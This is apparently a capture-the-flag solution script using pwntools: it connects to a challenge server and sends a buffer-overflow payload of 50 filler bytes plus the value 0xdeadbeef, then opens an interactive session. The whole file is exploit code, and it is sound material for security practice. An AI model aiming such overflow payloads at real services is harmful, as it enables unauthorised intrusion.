from pwn import *

r = remote('fusion.chals.ageei.org', 1337, ssl=True)

line = r.recvline()
print(line)
r.sendline(b"A" * 50 + b"\xef\xbe\xad\xde" + b"\n")
r.interactive()
